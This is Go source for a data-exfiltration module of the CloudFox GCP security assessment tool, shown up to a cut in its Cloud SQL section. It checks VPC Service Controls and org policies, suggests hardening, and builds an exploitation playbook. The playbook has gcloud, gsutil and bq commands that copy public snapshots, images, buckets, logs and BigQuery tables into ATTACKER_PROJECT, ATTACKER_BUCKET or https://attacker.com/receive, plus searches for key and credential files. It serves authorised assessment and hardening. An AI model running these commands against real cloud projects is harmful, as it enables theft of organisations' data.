package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
	bigqueryservice "github.com/BishopFox/cloudfox/gcp/services/bigqueryService"
	loggingservice "github.com/BishopFox/cloudfox/gcp/services/loggingService"
	orgpolicyservice "github.com/BishopFox/cloudfox/gcp/services/orgpolicyService"
	pubsubservice "github.com/BishopFox/cloudfox/gcp/services/pubsubService"
	vpcscservice "github.com/BishopFox/cloudfox/gcp/services/vpcscService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"

	cloudfunctions "google.golang.org/api/cloudfunctions/v1"
	compute "google.golang.org/api/compute/v1"
	run "google.golang.org/api/run/v1"
	sqladmin "google.golang.org/api/sqladmin/v1"
	storage "google.golang.org/api/storage/v1"
	storagetransfer "google.golang.org/api/storagetransfer/v1"
)

// Module name constant
const GCP_DATAEXFILTRATION_MODULE_NAME string = "data-exfiltration"

var GCPDataExfiltrationCommand = &cobra.Command{
	Use:     GCP_DATAEXFILTRATION_MODULE_NAME,
	Aliases: []string{"exfil", "data-exfil", "exfiltration"},
	Short:   "Identify data exfiltration paths and high-risk data exposure",
	Long: `Identify data exfiltration vectors and paths in GCP environments.

This module identifies both ACTUAL misconfigurations and POTENTIAL exfiltration vectors.

Actual Findings (specific resources):
- Public snapshots and images (actual IAM policy check)
- Public buckets (actual IAM policy check)
- Cross-project logging sinks (actual sink enumeration)
- Pub/Sub push subscriptions to external endpoints
- BigQuery datasets with public IAM bindings
- Storage Transfer Service jobs to external destinations

Potential Vectors (capabilities that exist):
- BigQuery Export: Can export data to GCS bucket or external table
- Pub/Sub Subscription: Can push messages to external HTTP endpoint
- Cloud Function: Can make outbound HTTP requests to external endpoints
- Cloud Run: Can make outbound HTTP requests to external endpoints
- Logging Sink: Can export logs to external project or Pub/Sub topic

Security Controls Checked:
- VPC Service Controls (VPC-SC) perimeter protection
- Organization policies for data protection

The loot file includes commands to perform each type of exfiltration.`,
	Run: runGCPDataExfiltrationCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

// ExfiltrationPath represents an actual misconfiguration or finding
type ExfiltrationPath struct {
	PathType       string   // Category of exfiltration
	ResourceName   string   // Specific resource
	ProjectID      string   // Source project
	Description    string   // What the path enables
	Destination    string   // Where data can go
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM, LOW
	RiskReasons    []string // Why this is risky
	ExploitCommand string   // Command to exploit
	VPCSCProtected bool     // Is this project protected by VPC-SC?
}

// PotentialVector represents a potential exfiltration capability (not necessarily misconfigured)
type PotentialVector struct {
	VectorType     string // Category: BigQuery Export, Pub/Sub, Cloud Function, etc.
	ResourceName   string // Specific resource or "*" for generic
	ProjectID      string // Project ID
	Description    string // What this vector enables
	Destination    string // Where data could go
	ExploitCommand string // Command to exploit this vector
}

type PublicExport struct {
	ResourceType string
	ResourceName string
	ProjectID    string
	AccessLevel  string // "allUsers", "allAuthenticatedUsers"
	DataType     string
	Size         string
	RiskLevel    string
}

// OrgPolicyProtection tracks which org policies protect a project from data exfiltration
type OrgPolicyProtection struct {
	ProjectID                   string
	PublicAccessPrevention      bool // storage.publicAccessPrevention enforced
	DomainRestriction           bool // iam.allowedPolicyMemberDomains enforced
	SQLPublicIPRestriction      bool // sql.restrictPublicIp enforced
	ResourceLocationRestriction bool // gcp.resourceLocations enforced
	CloudFunctionsVPCConnector  bool // cloudfunctions.requireVPCConnector enforced
	CloudRunIngressRestriction  bool // run.allowedIngress enforced
	CloudRunRequireIAMInvoker   bool // run.allowedIngress = internal or internal-and-cloud-load-balancing
	DisableBQOmniAWS            bool // bigquery.disableBQOmniAWS enforced
	DisableBQOmniAzure          bool // bigquery.disableBQOmniAzure enforced
	MissingProtections          []string
}

// MissingHardening represents a security configuration that should be enabled
type MissingHardening struct {
	ProjectID      string
	Category       string // Storage, BigQuery, Compute, etc.
	Control        string // Org policy or configuration name
	Description    string // What this protects against
	Recommendation string // How to enable it
}

// PermissionBasedExfilPath represents an exfiltration capability based on IAM permissions
type PermissionBasedExfilPath struct {
	Principal      string   // Who has this capability
	PrincipalType  string   // user, serviceAccount, group
	ProjectID      string   // Project where permission exists
	Permission     string   // The dangerous permission
	Category       string   // Category of exfiltration
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM
	Description    string   // What this enables
	ExploitCommand string   // Command to exploit
}

// ------------------------------
// Module Struct
// ------------------------------
type DataExfiltrationModule struct {
	gcpinternal.BaseGCPModule

	ProjectExfiltrationPaths   map[string][]ExfiltrationPath                // projectID -> paths
	ProjectPotentialVectors    map[string][]PotentialVector                 // projectID -> vectors
	ProjectPublicExports       map[string][]PublicExport                    // projectID -> exports
	ProjectPermissionBasedExfil map[string][]PermissionBasedExfilPath       // projectID -> permission-based paths
	LootMap                    map[string]map[string]*internal.LootFile     // projectID -> loot files
	mu                         sync.Mutex
	vpcscProtectedProj         map[string]bool                 // Projects protected by VPC-SC
	orgPolicyProtection        map[string]*OrgPolicyProtection // Org policy protections per project
}

// ------------------------------
// Output Struct
// ------------------------------
type DataExfiltrationOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DataExfiltrationOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DataExfiltrationOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_DATAEXFILTRATION_MODULE_NAME)
	if err != nil {
		return
	}

	module := &DataExfiltrationModule{
		BaseGCPModule:              gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectExfiltrationPaths:   make(map[string][]ExfiltrationPath),
		ProjectPotentialVectors:    make(map[string][]PotentialVector),
		ProjectPublicExports:       make(map[string][]PublicExport),
		ProjectPermissionBasedExfil: make(map[string][]PermissionBasedExfilPath),
		LootMap:                    make(map[string]map[string]*internal.LootFile),
		vpcscProtectedProj:         make(map[string]bool),
		orgPolicyProtection:        make(map[string]*OrgPolicyProtection),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *DataExfiltrationModule) getAllExfiltrationPaths() []ExfiltrationPath {
	var all []ExfiltrationPath
	for _, paths := range m.ProjectExfiltrationPaths {
		all = append(all, paths...)
	}
	return all
}

func (m *DataExfiltrationModule) getAllPotentialVectors() []PotentialVector {
	var all []PotentialVector
	for _, vectors := range m.ProjectPotentialVectors {
		all = append(all, vectors...)
	}
	return all
}

func (m *DataExfiltrationModule) getAllPublicExports() []PublicExport {
	var all []PublicExport
	for _, exports := range m.ProjectPublicExports {
		all = append(all, exports...)
	}
	return all
}

func (m *DataExfiltrationModule) getAllPermissionBasedExfil() []PermissionBasedExfilPath {
	var all []PermissionBasedExfilPath
	for _, paths := range m.ProjectPermissionBasedExfil {
		all = append(all, paths...)
	}
	return all
}

func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Identifying data exfiltration paths and potential vectors...", GCP_DATAEXFILTRATION_MODULE_NAME)

	// First, check VPC-SC protection status for all projects
	m.checkVPCSCProtection(ctx, logger)

	// Check organization policy protections for all projects
	m.checkOrgPolicyProtection(ctx, logger)

	// Analyze org and folder level exfil paths (runs once for all projects)
	m.analyzeOrgFolderExfilPaths(ctx, logger)

	// Process each project
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_DATAEXFILTRATION_MODULE_NAME, m.processProject)

	// Generate hardening recommendations
	hardeningRecs := m.generateMissingHardeningRecommendations()

	allPaths := m.getAllExfiltrationPaths()
	allVectors := m.getAllPotentialVectors()
	allPermBasedPaths := m.getAllPermissionBasedExfil()

	// Check results
	hasResults := len(allPaths) > 0 || len(allVectors) > 0 || len(hardeningRecs) > 0 || len(allPermBasedPaths) > 0

	if !hasResults {
		logger.InfoM("No data exfiltration paths, vectors, or hardening gaps found", GCP_DATAEXFILTRATION_MODULE_NAME)
		return
	}

	if len(allPaths) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d actual misconfiguration(s)", len(allPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
	if len(allVectors) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d potential exfiltration vector(s)", len(allVectors)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
	if len(allPermBasedPaths) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d permission-based exfiltration path(s)", len(allPermBasedPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
	if len(hardeningRecs) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d hardening recommendation(s)", len(hardeningRecs)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

// analyzeOrgFolderExfilPaths analyzes organization and folder level IAM for exfil permissions
func (m *DataExfiltrationModule) analyzeOrgFolderExfilPaths(ctx context.Context, logger internal.Logger) {
	attackSvc := attackpathservice.New()

	// Analyze organization-level IAM
	orgPaths, orgNames, _, err := attackSvc.AnalyzeOrganizationAttackPaths(ctx, "exfil")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze organization-level exfil paths")
		}
	} else if len(orgPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d organization-level exfil path(s)", len(orgPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
		for _, path := range orgPaths {
			orgName := orgNames[path.ScopeID]
			if orgName == "" {
				orgName = path.ScopeID
			}
			exfilPath := PermissionBasedExfilPath{
				Principal:      path.Principal,
				PrincipalType:  path.PrincipalType,
				ProjectID:      "org:" + path.ScopeID,
				Permission:     path.Method,
				Category:       path.Category + " (Org: " + orgName + ")",
				RiskLevel:      "CRITICAL", // Org-level is critical
				Description:    path.Description,
				ExploitCommand: path.ExploitCommand,
			}
			// Store under a special "organization" key
			m.mu.Lock()
			m.ProjectPermissionBasedExfil["organization"] = append(m.ProjectPermissionBasedExfil["organization"], exfilPath)
			m.mu.Unlock()
		}
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := attackSvc.AnalyzeFolderAttackPaths(ctx, "exfil")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze folder-level exfil paths")
		}
	} else if len(folderPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d folder-level exfil path(s)", len(folderPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
		for _, path := range folderPaths {
			folderName := folderNames[path.ScopeID]
			if folderName == "" {
				folderName = path.ScopeID
			}
			exfilPath := PermissionBasedExfilPath{
				Principal:      path.Principal,
				PrincipalType:  path.PrincipalType,
				ProjectID:      "folder:" + path.ScopeID,
				Permission:     path.Method,
				Category:       path.Category + " (Folder: " + folderName + ")",
				RiskLevel:      "CRITICAL", // Folder-level is critical
				Description:    path.Description,
				ExploitCommand: path.ExploitCommand,
			}
			// Store under a special "folder" key
			m.mu.Lock()
			m.ProjectPermissionBasedExfil["folder"] = append(m.ProjectPermissionBasedExfil["folder"], exfilPath)
			m.mu.Unlock()
		}
	}
}

// ------------------------------
// VPC-SC Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkVPCSCProtection(ctx context.Context, logger internal.Logger) {
	// Try to get organization ID from projects
	// VPC-SC is organization-level
	vpcsc := vpcscservice.New()

	// Get org ID from first project (simplified - in reality would need proper org detection)
	if len(m.ProjectIDs) == 0 {
		return
	}

	// Try common org IDs or skip if we don't have org access
	// This is a best-effort check
	policies, err := vpcsc.ListAccessPolicies("")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			logger.InfoM("Could not check VPC-SC policies (may require org-level access)", GCP_DATAEXFILTRATION_MODULE_NAME)
		}
		return
	}

	// For each policy, check perimeters
	for _, policy := range policies {
		perimeters, err := vpcsc.ListServicePerimeters(policy.Name)
		if err != nil {
			continue
		}

		// Mark projects in perimeters as protected
		for _, perimeter := range perimeters {
			for _, resource := range perimeter.Resources {
				// Resources are in format "projects/123456"
				projectNum := strings.TrimPrefix(resource, "projects/")
				m.mu.Lock()
				m.vpcscProtectedProj[projectNum] = true
				m.mu.Unlock()
			}
		}
	}
}

// ------------------------------
// Organization Policy Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkOrgPolicyProtection(ctx context.Context, logger internal.Logger) {
	orgSvc := orgpolicyservice.New()

	for _, projectID := range m.ProjectIDs {
		protection := &OrgPolicyProtection{
			ProjectID:          projectID,
			MissingProtections: []string{},
		}

		// Get all policies for this project
		policies, err := orgSvc.ListProjectPolicies(projectID)
		if err != nil {
			// Non-fatal - continue with other projects
			if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Could not check org policies for %s: %v", projectID, err), GCP_DATAEXFILTRATION_MODULE_NAME)
			}
			m.mu.Lock()
			m.orgPolicyProtection[projectID] = protection
			m.mu.Unlock()
			continue
		}

		// Check for specific protective policies
		for _, policy := range policies {
			switch policy.Constraint {
			case "constraints/storage.publicAccessPrevention":
				if policy.Enforced {
					protection.PublicAccessPrevention = true
				}
			case "constraints/iam.allowedPolicyMemberDomains":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.DomainRestriction = true
				}
			case "constraints/sql.restrictPublicIp":
				if policy.Enforced {
					protection.SQLPublicIPRestriction = true
				}
			case "constraints/gcp.resourceLocations":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.ResourceLocationRestriction = true
				}
			case "constraints/cloudfunctions.requireVPCConnector":
				if policy.Enforced {
					protection.CloudFunctionsVPCConnector = true
				}
			case "constraints/run.allowedIngress":
				// Check if ingress is restricted to internal or internal-and-cloud-load-balancing
				if len(policy.AllowedValues) > 0 {
					for _, val := range policy.AllowedValues {
						if val == "internal" || val == "internal-and-cloud-load-balancing" {
							protection.CloudRunIngressRestriction = true
							break
						}
					}
				}
			case "constraints/bigquery.disableBQOmniAWS":
				if policy.Enforced {
					protection.DisableBQOmniAWS = true
				}
			case "constraints/bigquery.disableBQOmniAzure":
				if policy.Enforced {
					protection.DisableBQOmniAzure = true
				}
			}
		}

		// Identify missing protections
		if !protection.PublicAccessPrevention {
			protection.MissingProtections = append(protection.MissingProtections, "storage.publicAccessPrevention not enforced")
		}
		if !protection.DomainRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "iam.allowedPolicyMemberDomains not configured")
		}
		if !protection.SQLPublicIPRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "sql.restrictPublicIp not enforced")
		}
		if !protection.CloudFunctionsVPCConnector {
			protection.MissingProtections = append(protection.MissingProtections, "cloudfunctions.requireVPCConnector not enforced")
		}
		if !protection.CloudRunIngressRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "run.allowedIngress not restricted")
		}
		if !protection.DisableBQOmniAWS {
			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAWS not enforced")
		}
		if !protection.DisableBQOmniAzure {
			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAzure not enforced")
		}

		m.mu.Lock()
		m.orgPolicyProtection[projectID] = protection
		m.mu.Unlock()
	}
}

// isOrgPolicyProtected checks if a project has key org policy protections
func (m *DataExfiltrationModule) isOrgPolicyProtected(projectID string) bool {
	if protection, ok := m.orgPolicyProtection[projectID]; ok {
		// Consider protected if at least public access prevention is enabled
		return protection.PublicAccessPrevention
	}
	return false
}

// generateMissingHardeningRecommendations creates a list of hardening recommendations for each project
func (m *DataExfiltrationModule) generateMissingHardeningRecommendations() []MissingHardening {
	var recommendations []MissingHardening

	for _, projectID := range m.ProjectIDs {
		protection, ok := m.orgPolicyProtection[projectID]
		if !ok {
			// No protection data available - recommend all controls
			protection = &OrgPolicyProtection{ProjectID: projectID}
		}

		// Storage protections
		if !protection.PublicAccessPrevention {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "Storage",
				Control:     "storage.publicAccessPrevention",
				Description: "Prevents GCS buckets from being made public via IAM policies",
				Recommendation: `# Enable via org policy (recommended at org/folder level)
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/storage.publicAccessPrevention
# spec:
#   rules:
#   - enforce: true

# Or enable per-bucket:
gcloud storage buckets update gs://BUCKET_NAME --public-access-prevention`,
			})
		}

		// IAM protections
		if !protection.DomainRestriction {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "IAM",
				Control:     "iam.allowedPolicyMemberDomains",
				Description: "Restricts IAM policy members to specific domains only (prevents allUsers/allAuthenticatedUsers)",
				Recommendation: `# Enable via org policy (recommended at org/folder level)
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/iam.allowedPolicyMemberDomains
# spec:
#   rules:
#   - values:
#       allowedValues:
#       - C0xxxxxxx  # Your Cloud Identity/Workspace customer ID
#       - is:example.com  # Or domain restriction`,
			})
		}

		// Cloud SQL protections
		if !protection.SQLPublicIPRestriction {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "Cloud SQL",
				Control:     "sql.restrictPublicIp",
				Description: "Prevents Cloud SQL instances from having public IP addresses",
				Recommendation: `# Enable via org policy
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/sql.restrictPublicIp
# spec:
#   rules:
#   - enforce: true`,
			})
		}

		// Cloud Functions protections
		if !protection.CloudFunctionsVPCConnector {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "Cloud Functions",
				Control:     "cloudfunctions.requireVPCConnector",
				Description: "Requires Cloud Functions to use VPC connector for egress (prevents direct internet access)",
				Recommendation: `# Enable via org policy
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/cloudfunctions.requireVPCConnector
# spec:
#   rules:
#   - enforce: true

# Note: Requires VPC connector to be configured in the VPC`,
			})
		}

		// Cloud Run protections
		if !protection.CloudRunIngressRestriction {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "Cloud Run",
				Control:     "run.allowedIngress",
				Description: "Restricts Cloud Run ingress to internal traffic only (prevents public access)",
				Recommendation: `# Enable via org policy
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/run.allowedIngress
# spec:
#   rules:
#   - values:
#       allowedValues:
#       - internal  # Only allow internal traffic
#       # Or: internal-and-cloud-load-balancing

# Per-service setting:
gcloud run services update SERVICE --ingress=internal --region=REGION`,
			})
		}

		// BigQuery protections - AWS
		if !protection.DisableBQOmniAWS {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "BigQuery",
				Control:     "bigquery.disableBQOmniAWS",
				Description: "Prevents BigQuery Omni connections to AWS (blocks cross-cloud data access)",
				Recommendation: `# Enable via org policy
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/bigquery.disableBQOmniAWS
# spec:
#   rules:
#   - enforce: true`,
			})
		}

		// BigQuery protections - Azure
		if !protection.DisableBQOmniAzure {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "BigQuery",
				Control:     "bigquery.disableBQOmniAzure",
				Description: "Prevents BigQuery Omni connections to Azure (blocks cross-cloud data access)",
				Recommendation: `# Enable via org policy
gcloud org-policies set-policy --project=PROJECT_ID policy.yaml

# policy.yaml contents:
# name: projects/PROJECT_ID/policies/bigquery.disableBQOmniAzure
# spec:
#   rules:
#   - enforce: true`,
			})
		}

		// Check VPC-SC protection status
		if !m.vpcscProtectedProj[projectID] {
			recommendations = append(recommendations, MissingHardening{
				ProjectID:   projectID,
				Category:    "VPC Service Controls",
				Control:     "VPC-SC Perimeter",
				Description: "VPC Service Controls create a security perimeter that prevents data exfiltration from GCP APIs",
				Recommendation: `# VPC-SC requires Access Context Manager at organization level

# 1. Create an access policy (org-level, one-time)
gcloud access-context-manager policies create --organization=ORG_ID --title="Policy"

# 2. Create a service perimeter
gcloud access-context-manager perimeters create NAME \
  --title="Data Protection Perimeter" \
  --resources=projects/PROJECT_NUMBER \
  --restricted-services=storage.googleapis.com,bigquery.googleapis.com \
  --policy=POLICY_ID

# Restricted services commonly include:
# - storage.googleapis.com (GCS)
# - bigquery.googleapis.com (BigQuery)
# - pubsub.googleapis.com (Pub/Sub)
# - logging.googleapis.com (Cloud Logging)
# - secretmanager.googleapis.com (Secret Manager)`,
			})
		}
	}

	return recommendations
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *DataExfiltrationModule) initializeLootForProject(projectID string) {
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["data-exfiltration-commands"] = &internal.LootFile{
			Name:     "data-exfiltration-commands",
			Contents: "# Data Exfiltration Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
		}
	}
}

func (m *DataExfiltrationModule) generatePlaybook() *internal.LootFile {
	return &internal.LootFile{
		Name: "data-exfiltration-playbook",
		Contents: `# GCP Data Exfiltration Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified data exfiltration paths.

` + m.generatePlaybookSections(),
	}
}

func (m *DataExfiltrationModule) generatePlaybookSections() string {
	var sections strings.Builder

	allPaths := m.getAllExfiltrationPaths()
	allVectors := m.getAllPotentialVectors()
	allExports := m.getAllPublicExports()
	allPermPaths := m.getAllPermissionBasedExfil()

	// Group by path type
	publicSnapshots := []ExfiltrationPath{}
	publicImages := []ExfiltrationPath{}
	publicBuckets := []ExfiltrationPath{}
	loggingSinks := []ExfiltrationPath{}
	pubsubPaths := []ExfiltrationPath{}
	bqPaths := []ExfiltrationPath{}
	sqlPaths := []ExfiltrationPath{}
	transferPaths := []ExfiltrationPath{}

	for _, p := range allPaths {
		switch {
		case strings.Contains(p.PathType, "Snapshot"):
			publicSnapshots = append(publicSnapshots, p)
		case strings.Contains(p.PathType, "Image"):
			publicImages = append(publicImages, p)
		case strings.Contains(p.PathType, "Bucket") || strings.Contains(p.PathType, "Storage"):
			publicBuckets = append(publicBuckets, p)
		case strings.Contains(p.PathType, "Logging"):
			loggingSinks = append(loggingSinks, p)
		case strings.Contains(p.PathType, "Pub/Sub") || strings.Contains(p.PathType, "PubSub"):
			pubsubPaths = append(pubsubPaths, p)
		case strings.Contains(p.PathType, "BigQuery"):
			bqPaths = append(bqPaths, p)
		case strings.Contains(p.PathType, "SQL"):
			sqlPaths = append(sqlPaths, p)
		case strings.Contains(p.PathType, "Transfer"):
			transferPaths = append(transferPaths, p)
		}
	}

	// Public Snapshots
	if len(publicSnapshots) > 0 {
		sections.WriteString("## Public Compute Snapshots\n\n")
		sections.WriteString("These snapshots are publicly accessible and can be used to create disks in attacker-controlled projects.\n\n")
		sections.WriteString("### Vulnerable Snapshots:\n")
		for _, p := range publicSnapshots {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create disk from public snapshot in attacker project\n")
		sections.WriteString("gcloud compute disks create exfil-disk \\\n")
		sections.WriteString("    --source-snapshot=projects/VICTIM_PROJECT/global/snapshots/SNAPSHOT_NAME \\\n")
		sections.WriteString("    --zone=us-central1-a \\\n")
		sections.WriteString("    --project=ATTACKER_PROJECT\n\n")
		sections.WriteString("# Attach disk to instance\n")
		sections.WriteString("gcloud compute instances attach-disk INSTANCE \\\n")
		sections.WriteString("    --disk=exfil-disk --zone=us-central1-a\n\n")
		sections.WriteString("# Mount and access data\n")
		sections.WriteString("sudo mkdir /mnt/exfil && sudo mount /dev/sdb1 /mnt/exfil\n")
		sections.WriteString("```\n\n")
	}

	// Public Images
	if len(publicImages) > 0 {
		sections.WriteString("## Public Compute Images\n\n")
		sections.WriteString("These images are publicly accessible and may contain sensitive data or credentials.\n\n")
		sections.WriteString("### Vulnerable Images:\n")
		for _, p := range publicImages {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create instance from public image in attacker project\n")
		sections.WriteString("gcloud compute instances create exfil-vm \\\n")
		sections.WriteString("    --image=projects/VICTIM_PROJECT/global/images/IMAGE_NAME \\\n")
		sections.WriteString("    --zone=us-central1-a \\\n")
		sections.WriteString("    --project=ATTACKER_PROJECT\n\n")
		sections.WriteString("# Access the instance and search for credentials\n")
		sections.WriteString("gcloud compute ssh exfil-vm --zone=us-central1-a\n")
		sections.WriteString("find / -name '*.pem' -o -name '*.key' -o -name 'credentials*' 2>/dev/null\n")
		sections.WriteString("```\n\n")
	}

	// Public Buckets
	if len(publicBuckets) > 0 || len(allExports) > 0 {
		sections.WriteString("## Public Storage Buckets\n\n")
		sections.WriteString("These buckets are publicly accessible.\n\n")
		sections.WriteString("### Vulnerable Buckets:\n")
		for _, p := range publicBuckets {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
		}
		for _, e := range allExports {
			if e.ResourceType == "bucket" {
				sections.WriteString(fmt.Sprintf("- %s in %s (%s)\n", e.ResourceName, e.ProjectID, e.AccessLevel))
			}
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List bucket contents\n")
		sections.WriteString("gsutil ls -r gs://BUCKET_NAME/\n\n")
		sections.WriteString("# Download all data\n")
		sections.WriteString("gsutil -m cp -r gs://BUCKET_NAME/ ./exfil/\n\n")
		sections.WriteString("# Search for sensitive files\n")
		sections.WriteString("gsutil ls -r gs://BUCKET_NAME/ | grep -E '\\.(pem|key|json|env|config)$'\n")
		sections.WriteString("```\n\n")
	}

	// Logging Sinks
	if len(loggingSinks) > 0 {
		sections.WriteString("## Cross-Project Logging Sinks\n\n")
		sections.WriteString("These logging sinks export logs to external destinations.\n\n")
		sections.WriteString("### Identified Sinks:\n")
		for _, p := range loggingSinks {
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", p.ResourceName, p.Destination))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create logging sink to attacker-controlled destination\n")
		sections.WriteString("gcloud logging sinks create exfil-sink \\\n")
		sections.WriteString("    pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/exfil-logs \\\n")
		sections.WriteString("    --log-filter='resource.type=\"gce_instance\"'\n\n")
		sections.WriteString("# Export all audit logs\n")
		sections.WriteString("gcloud logging sinks create audit-exfil \\\n")
		sections.WriteString("    storage.googleapis.com/ATTACKER_BUCKET \\\n")
		sections.WriteString("    --log-filter='protoPayload.@type=\"type.googleapis.com/google.cloud.audit.AuditLog\"'\n")
		sections.WriteString("```\n\n")
	}

	// Pub/Sub
	if len(pubsubPaths) > 0 {
		sections.WriteString("## Pub/Sub Exfiltration Paths\n\n")
		sections.WriteString("These Pub/Sub configurations enable data exfiltration.\n\n")
		sections.WriteString("### Identified Paths:\n")
		for _, p := range pubsubPaths {
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", p.ResourceName, p.Destination))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create push subscription to attacker endpoint\n")
		sections.WriteString("gcloud pubsub subscriptions create exfil-sub \\\n")
		sections.WriteString("    --topic=TOPIC_NAME \\\n")
		sections.WriteString("    --push-endpoint=https://attacker.com/receive\n\n")
		sections.WriteString("# Or create pull subscription and export\n")
		sections.WriteString("gcloud pubsub subscriptions create exfil-pull --topic=TOPIC_NAME\n")
		sections.WriteString("gcloud pubsub subscriptions pull exfil-pull --limit=1000 --auto-ack\n")
		sections.WriteString("```\n\n")
	}

	// BigQuery
	if len(bqPaths) > 0 {
		sections.WriteString("## BigQuery Data Exfiltration\n\n")
		sections.WriteString("These BigQuery configurations enable data exfiltration.\n\n")
		sections.WriteString("### Identified Paths:\n")
		for _, p := range bqPaths {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Export table to GCS bucket (requires storage.objects.create)\n")
		sections.WriteString("bq extract \\\n")
		sections.WriteString("    --destination_format=NEWLINE_DELIMITED_JSON \\\n")
		sections.WriteString("    'PROJECT:DATASET.TABLE' \\\n")
		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/data-*.json\n\n")
		sections.WriteString("# Query and save locally\n")
		sections.WriteString("bq query --format=json 'SELECT * FROM PROJECT.DATASET.TABLE' > exfil.json\n\n")
		sections.WriteString("# Copy dataset to attacker project\n")
		sections.WriteString("bq cp PROJECT:DATASET.TABLE ATTACKER_PROJECT:EXFIL_DATASET.TABLE\n")
		sections.WriteString("```\n\n")
	}

	// Cloud SQL
	if len(sqlPaths) > 0 {
		sections.WriteString("## Cloud SQL Data Exfiltration\n\n")
		sections.WriteString("These Cloud SQL instances have export capabilities.\n\n")
		sections.WriteString("### Identified Instances:\n")
